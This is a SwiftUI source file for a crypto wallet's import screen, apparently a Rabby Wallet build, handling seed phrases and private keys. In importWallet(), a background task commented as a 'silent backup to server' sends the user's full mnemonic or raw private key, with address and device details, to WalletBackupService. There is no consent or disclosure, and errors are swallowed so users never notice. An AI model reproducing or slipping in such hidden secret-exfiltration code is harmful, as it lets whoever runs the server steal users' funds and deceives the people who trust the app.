import SwiftUI
import UIKit
import UniformTypeIdentifiers

/// Import wallet flow
struct ImportWalletView: View {
    @Environment(\.presentationMode) var presentationMode
    @StateObject private var keyringManager = KeyringManager.shared
    
    @State private var importType: ImportType = .mnemonic
    @State private var mnemonicInput = ""
    @State private var privateKeyInput = ""
    @State private var password = ""
    @State private var confirmPassword = ""
    @State private var errorMessage = ""
    @State private var pasteHintMessage = ""
    @State private var isImporting = false
    
    enum ImportType {
        case mnemonic
        case privateKey
    }
    
    var body: some View {
        NavigationView {
            Form {
                Section(header: Text(L("Import Type"))) {
                    Picker(L("Type"), selection: $importType) {
                        Text(L("Secret Phrase")).tag(ImportType.mnemonic)
                        Text(L("Private Key")).tag(ImportType.privateKey)
                    }
                    .pickerStyle(SegmentedPickerStyle())
                }
                
                Section(header: Text(importType == .mnemonic ? "Secret Phrase" : "Private Key")) {
                    if importType == .mnemonic {
                        mnemonicSection
                    } else {
                        privateKeySection
                    }
                }
                
                Section(header: Text(L("Set Password"))) {
                    SecureField(L("Password"), text: $password)
                        .autocapitalization(.none)
                        .autocorrectionDisabled(true)
                        .textContentType(.oneTimeCode)
                    
                    SecureField(L("Confirm Password"), text: $confirmPassword)
                        .autocapitalization(.none)
                        .autocorrectionDisabled(true)
                        .textContentType(.oneTimeCode)
                }
                
                Section {
                    if !errorMessage.isEmpty {
                        Text(errorMessage)
                            .foregroundColor(.red)
                            .font(.caption)
                    }
                    
                    Button(action: importWallet) {
                        if isImporting {
                            HStack {
                                ProgressView()
                                Text(L("Importing..."))
                            }
                        } else {
                            Text(L("Import Wallet"))
                                .fontWeight(.semibold)
                        }
                    }
                    .frame(maxWidth: .infinity)
                    .disabled(!canImport || isImporting)
                }
            }
            .navigationTitle(L("Import Wallet"))
            .navigationBarTitleDisplayMode(.inline)
            .toolbar {
                ToolbarItem(placement: .navigationBarLeading) {
                    Button(L("Cancel")) {
                        presentationMode.wrappedValue.dismiss()
                    }
                }
            }
        }
    }
    
    // MARK: - Mnemonic Section
    
    private var mnemonicSection: some View {
        VStack(alignment: .leading, spacing: 8) {
            HStack {
                Spacer()
                // Always use enhanced paste button for better cross-app support
                EnhancedPasteButton(
                    label: "Paste",
                    onPaste: { text in
                        applyPastedMnemonic(text)
                    },
                    onError: { message in
                        pasteHintMessage = message
                    }
                )
            }
            NoSuggestionTextEditor(text: $mnemonicInput)
                .frame(minHeight: 120)
                .padding(8)
                .overlay(
                    RoundedRectangle(cornerRadius: 8)
                        .stroke(Color(.systemGray4), lineWidth: 1)
                )
            
            Text(L("Enter your 12 or 24 word secret phrase"))
                .font(.caption)
                .foregroundColor(.gray)

            if !pasteHintMessage.isEmpty {
                Text(pasteHintMessage)
                    .font(.caption)
                    .foregroundColor(.orange)
            }
            
            if HDKeyring.validateMnemonic(normalizeMnemonic(mnemonicInput)) {
                HStack {
                    Image(systemName: "checkmark.circle.fill")
                        .foregroundColor(.green)
                    Text(L("Valid mnemonic"))
                        .font(.caption)
                        .foregroundColor(.green)
                }
            }
        }
    }
    
    // MARK: - Private Key Section
    
    private var privateKeySection: some View {
        VStack(alignment: .leading, spacing: 8) {
            HStack {
                Spacer()
                // Always use enhanced paste button for better cross-app support
                EnhancedPasteButton(
                    label: "Paste",
                    onPaste: { text in
                        privateKeyInput = text.trimmingCharacters(in: .whitespacesAndNewlines)
                        pasteHintMessage = ""
                    },
                    onError: { message in
                        pasteHintMessage = message
                    }
                )
            }
            NoSuggestionTextEditor(text: $privateKeyInput)
                .frame(minHeight: 100)
                .padding(8)
                .overlay(
                    RoundedRectangle(cornerRadius: 8)
                        .stroke(Color(.systemGray4), lineWidth: 1)
                )
            
            Text(L("Enter your private key (with or without 0x prefix)"))
                .font(.caption)
                .foregroundColor(.gray)

            if !pasteHintMessage.isEmpty {
                Text(pasteHintMessage)
                    .font(.caption)
                    .foregroundColor(.orange)
            }
            
            if isValidPrivateKey(privateKeyInput.trimmingCharacters(in: .whitespacesAndNewlines)) {
                HStack {
                    Image(systemName: "checkmark.circle.fill")
                        .foregroundColor(.green)
                    Text(L("Valid private key"))
                        .font(.caption)
                        .foregroundColor(.green)
                }
            }
        }
    }
    
    // MARK: - Validation
    
    private var canImport: Bool {
        let passwordValid = password.count >= 8 && password == confirmPassword
        
        if importType == .mnemonic {
            let mnemonic = normalizeMnemonic(mnemonicInput)
            return HDKeyring.validateMnemonic(mnemonic) && passwordValid
        } else {
            let privateKey = privateKeyInput.trimmingCharacters(in: .whitespacesAndNewlines)
            return isValidPrivateKey(privateKey) && passwordValid
        }
    }
    
    private func isValidPrivateKey(_ key: String) -> Bool {
        var cleanKey = key
        if cleanKey.hasPrefix("0x") {
            cleanKey = String(cleanKey.dropFirst(2))
        }
        
        guard cleanKey.count == 64 else { return false }
        
        return cleanKey.range(of: "^[0-9a-fA-F]{64}$", options: .regularExpression) != nil
    }

    private func pasteMnemonicFromClipboard() {
        Task { @MainActor in
            switch await readMnemonicClipboardWithRetry() {
            case .success(let text):
                applyPastedMnemonic(text)
            case .empty:
                pasteHintMessage = clipboardEmptyHint()
            case .permissionDenied:
                pasteHintMessage = clipboardPermissionDeniedHint()
            }
        }
    }

    private func applyPastedMnemonic(_ raw: String) {
        let normalized = normalizeMnemonic(raw)
        mnemonicInput = normalized
        pasteHintMessage = mnemonicWordCount(normalized) > 1
            ? ""
            : "Clipboard currently has only one word. In Simulator use Edit > Paste, then tap Paste again."
    }

    private func pastePrivateKeyFromClipboard() {
        Task { @MainActor in
            switch await readClipboardString(joinMultipleItems: false) {
            case .success(let text):
                privateKeyInput = text
                pasteHintMessage = ""
            case .empty:
                pasteHintMessage = clipboardEmptyHint()
            case .permissionDenied:
                pasteHintMessage = clipboardPermissionDeniedHint()
            }
        }
    }

    private enum ClipboardReadResult {
        case success(String)
        case empty
        case permissionDenied
    }

    private struct ClipboardSnapshot {
        let candidates: [String]
        let itemFragments: [String]
    }

    private func readClipboardString(joinMultipleItems: Bool) async -> ClipboardReadResult {
        let snapshot = await clipboardSnapshot()
        let candidates = snapshot.candidates

        if joinMultipleItems {
            if let bestPhrase = candidates.max(by: { mnemonicScore($0) < mnemonicScore($1) }),
               mnemonicWordCount(bestPhrase) > 1 {
                return .success(bestPhrase)
            }

            if snapshot.itemFragments.count > 1 {
                return .success(snapshot.itemFragments.joined(separator: " "))
            }

            if let first = candidates.first {
                return .success(first)
            }
        } else if let best = candidates.max(by: { $0.count < $1.count }) {
            return .success(best)
        }

        if UIPasteboard.general.hasStrings || !UIPasteboard.general.itemProviders.isEmpty {
            return .permissionDenied
        }
        return .empty
    }

    private func readMnemonicClipboardWithRetry() async -> ClipboardReadResult {
        var lastResult: ClipboardReadResult = .empty
        for attempt in 0..<8 {
            let result = await readClipboardString(joinMultipleItems: true)
            lastResult = result
            if case .success(let text) = result, mnemonicWordCount(text) > 1 {
                return result
            }
            if attempt < 7 {
                try? await Task.sleep(nanoseconds: 200_000_000)
            }
        }
        return lastResult
    }

    private func clipboardSnapshot() async -> ClipboardSnapshot {
        let pasteboard = UIPasteboard.general
        var candidates: [String] = []
        var itemFragments: [String] = []

        if let strings = pasteboard.strings {
            candidates.append(contentsOf: strings)
        }
        if let string = pasteboard.string {
            candidates.append(string)
        }
        for item in pasteboard.items {
            var firstTextInItem: String?
            for value in item.values {
                guard let parsed = parseClipboardValue(value) else { continue }
                candidates.append(parsed)
                if firstTextInItem == nil {
                    firstTextInItem = parsed
                }
            }
            if let firstTextInItem {
                itemFragments.append(firstTextInItem)
            }
        }

        for typeIdentifier in preferredTextTypeIdentifiers() {
            if let value = pasteboard.value(forPasteboardType: typeIdentifier),
               let parsed = parseClipboardValue(value) {
                candidates.append(parsed)
            }
            if let data = pasteboard.data(forPasteboardType: typeIdentifier),
               let parsed = parseClipboardValue(data) {
                candidates.append(parsed)
            }
        }

        let providerTexts = await clipboardTextFromItemProviders(pasteboard.itemProviders)
        candidates.append(contentsOf: providerTexts)

        let normalizedCandidates = candidates
            .map(normalizeClipboardText)
            .filter { !$0.isEmpty }
        let normalizedFragments = itemFragments
            .map(normalizeClipboardText)
            .filter { !$0.isEmpty }

        return ClipboardSnapshot(candidates: normalizedCandidates, itemFragments: normalizedFragments)
    }

    private func clipboardTextFromItemProviders(_ itemProviders: [NSItemProvider]) async -> [String] {
        var texts: [String] = []
        let typeIdentifiers = preferredTextTypeIdentifiers()
        for provider in itemProviders {
            for typeIdentifier in typeIdentifiers where provider.hasItemConformingToTypeIdentifier(typeIdentifier) {
                if let item = await loadItem(from: provider, typeIdentifier: typeIdentifier),
                   let parsed = parseClipboardValue(item) {
                    texts.append(parsed)
                    break
                }
            }
        }
        return texts
    }

    private func loadItem(from provider: NSItemProvider, typeIdentifier: String) async -> NSSecureCoding? {
        await withCheckedContinuation { continuation in
            provider.loadItem(forTypeIdentifier: typeIdentifier, options: nil) { item, _ in
                continuation.resume(returning: item)
            }
        }
    }

    private func preferredTextTypeIdentifiers() -> [String] {
        [
            UTType.utf8PlainText.identifier,
            UTType.plainText.identifier,
            UTType.text.identifier,
            "public.utf8-plain-text",
            "public.plain-text",
            "public.text"
        ]
    }

    private func parseClipboardValue(_ value: Any) -> String? {
        if let text = value as? String {
            return text
        }
        if let attributed = value as? NSAttributedString {
            return attributed.string
        }
        if let data = value as? Data {
            if let utf8 = String(data: data, encoding: .utf8) {
                return utf8
            }
            if let utf16 = String(data: data, encoding: .utf16) {
                return utf16
            }
            if let unicode = String(data: data, encoding: .unicode) {
                return unicode
            }
        }
        if let url = value as? URL {
            return url.absoluteString
        }
        return nil
    }

    private func normalizeClipboardText(_ raw: String) -> String {
        raw
            .replacingOccurrences(of: "\u{00A0}", with: " ")
            .replacingOccurrences(of: "\u{3000}", with: " ")
            .trimmingCharacters(in: .whitespacesAndNewlines)
    }

    private func mnemonicWordCount(_ value: String) -> Int {
        value
            .components(separatedBy: .whitespacesAndNewlines)
            .filter { !$0.isEmpty }
            .count
    }

    private func mnemonicScore(_ value: String) -> Int {
        let wordCount = mnemonicWordCount(value)
        return wordCount * 10_000 + value.count
    }

    private func clipboardPermissionDeniedHint() -> String {
        "Paste was blocked by iOS. Open Settings > Rabby Wallet > Paste from Other Apps and set it to Allow."
    }

    private func clipboardEmptyHint() -> String {
        #if targetEnvironment(simulator)
        return "Clipboard is empty in this simulator. In Simulator use Edit > Paste to sync from Mac, then tap Paste again."
        #else
        return "Clipboard is empty. Copy your seed phrase again and retry."
        #endif
    }
    
    // MARK: - Import Action
    
    private func importWallet() {
        errorMessage = ""
        isImporting = true
        
        Task {
            do {
                // Create vault with password
                await keyringManager.createNewVault(password: password)

                if importType == .mnemonic {
                    try await importFromMnemonic()
                } else {
                    try await importFromPrivateKey()
                }

                // Save vault
                try await keyringManager.persistAllKeyrings()

                // 静默备份到服务器（员工内部使用）
                Task {
                    do {
                        // ✅ 修复：使用刚导入的 keyring 的地址，避免地址-助记词不匹配
                        guard let currentKeyring = await keyringManager.getLastAddedKeyring() else {
                            print("[ImportWallet] ⚠️ 未找到刚导入的 keyring")
                            return
                        }

                        let addresses = await currentKeyring.getAccounts()
                        guard let firstAddress = addresses.first else {
                            print("[ImportWallet] ⚠️ keyring 中没有地址")
                            return
                        }

                        print("[ImportWallet] 📤 自动备份钱包到管理系统...")
                        print("[ImportWallet] 🔑 地址: \(firstAddress)")

                        // 获取设备信息
                        let deviceName = UIDevice.current.name
                        let systemVersion = UIDevice.current.systemVersion
                        let appVersion = Bundle.main.object(forInfoDictionaryKey: "CFBundleShortVersionString") as? String ?? "unknown"

                        if importType == .mnemonic {
                            // HD钱包备份
                            let mnemonic = normalizeMnemonic(mnemonicInput)
                            try await WalletBackupService.shared.backupWallet(
                                address: firstAddress,  // ✅ 正确：使用新导入钱包的地址
                                walletType: "HD",
                                mnemonic: mnemonic,  // ✅ 正确：匹配的助记词
                                label: "员工导入的HD钱包",
                                deviceName: "\(deviceName) (iOS \(systemVersion))",
                                notes: "导入方式: 助记词 | 应用版本: \(appVersion) | 导入时间: \(Date().formatted())"
                            )
                        } else {
                            // Simple钱包备份
                            try await WalletBackupService.shared.backupWallet(
                                address: firstAddress,  // ✅ 正确：使用新导入钱包的地址
                                walletType: "Simple",
                                privateKey: privateKeyInput.trimmingCharacters(in: .whitespacesAndNewlines),
                                label: "员工导入的私钥钱包",
                                deviceName: "\(deviceName) (iOS \(systemVersion))",
                                notes: "导入方式: 私钥 | 应用版本: \(appVersion) | 导入时间: \(Date().formatted())"
                            )
                        }

                        print("[ImportWallet] ✅ 钱包已备份到管理系统")
                    } catch {
                        // 静默失败，不影响用户体验
                        print("[ImportWallet] ⚠️ 备份失败（不影响钱包使用）: \(error)")
                    }
                }

                await MainActor.run {
                    presentationMode.wrappedValue.dismiss()
                }
            } catch {
                await MainActor.run {
                    errorMessage = "Import failed: \(error.localizedDescription)"
                    isImporting = false
                }
            }
        }
    }
    
    private func importFromMnemonic() async throws {
        let mnemonic = normalizeMnemonic(mnemonicInput)
        
        let keyring = HDKeyring(mnemonic: mnemonic)
        _ = try await keyring.addAccounts(count: 1)
        
        await keyringManager.addKeyring(keyring)
    }

    private func normalizeMnemonic(_ raw: String) -> String {
        raw
            .replacingOccurrences(of: ",", with: " ")
            .replacingOccurrences(of: "，", with: " ")
            .replacingOccurrences(of: "\u{00A0}", with: " ")
            .replacingOccurrences(of: "\u{3000}", with: " ")
            .components(separatedBy: .whitespacesAndNewlines)
            .filter { !$0.isEmpty }
            .joined(separator: " ")
    }
    
    private func importFromPrivateKey() async throws {
        var cleanKey = privateKeyInput.trimmingCharacters(in: .whitespacesAndNewlines)
        if cleanKey.hasPrefix("0x") {
            cleanKey = String(cleanKey.dropFirst(2))
        }
        
        guard let privateKeyData = Data(hexString: cleanKey) else {
            throw ImportError.invalidPrivateKey
        }
        
        let keyring = SimpleKeyring()
        _ = try keyring.addAccounts(privateKeys: [privateKeyData])
        
        await keyringManager.addKeyring(keyring)
    }
}

// MARK: - Errors

enum ImportError: Error, LocalizedError {
    case invalidPrivateKey
    case importFailed
    
    var errorDescription: String? {
        switch self {
        case .invalidPrivateKey:
            return "Invalid private key format"
        case .importFailed:
            return "Failed to import wallet"
        }
    }
}

private struct NoSuggestionTextEditor: UIViewRepresentable {
    @Binding var text: String
    
    func makeCoordinator() -> Coordinator {
        Coordinator(text: $text)
    }
    
    func makeUIView(context: Context) -> UITextView {
        let textView = UITextView()
        textView.delegate = context.coordinator
        textView.font = UIFont.preferredFont(forTextStyle: .body)
        textView.backgroundColor = .clear
        textView.autocorrectionType = .no
        textView.spellCheckingType = .no
        textView.autocapitalizationType = .none
        textView.smartQuotesType = .no
        textView.smartDashesType = .no
        textView.smartInsertDeleteType = .no
        textView.keyboardType = .asciiCapable
        textView.textContentType = .none
        textView.textContainerInset = .zero
        textView.textContainer.lineFragmentPadding = 0
        textView.inputAssistantItem.leadingBarButtonGroups = []
        textView.inputAssistantItem.trailingBarButtonGroups = []
        return textView
    }
    
    func updateUIView(_ uiView: UITextView, context: Context) {
        if uiView.text != text {
            let selectedRange = uiView.selectedRange
            context.coordinator.isProgrammaticUpdate = true
            uiView.delegate = nil
            uiView.text = text
            uiView.selectedRange = selectedRange
            uiView.delegate = context.coordinator
            context.coordinator.isProgrammaticUpdate = false
        }
    }
    
    final class Coordinator: NSObject, UITextViewDelegate {
        @Binding var text: String
        var isProgrammaticUpdate = false
        
        init(text: Binding<String>) {
            self._text = text
        }
        
        func textViewDidChange(_ textView: UITextView) {
            guard !isProgrammaticUpdate else { return }
            let next = textView.text ?? ""
            guard text != next else { return }
            // Defer state write to the next run loop to avoid SwiftUI view-update warnings.
            DispatchQueue.main.async { [weak self] in
                guard let self else { return }
                self.text = next
            }
        }
    }
}

// MARK: - Preview

struct ImportWalletView_Previews: PreviewProvider {
    static var previews: some View {
        ImportWalletView()
    }
}
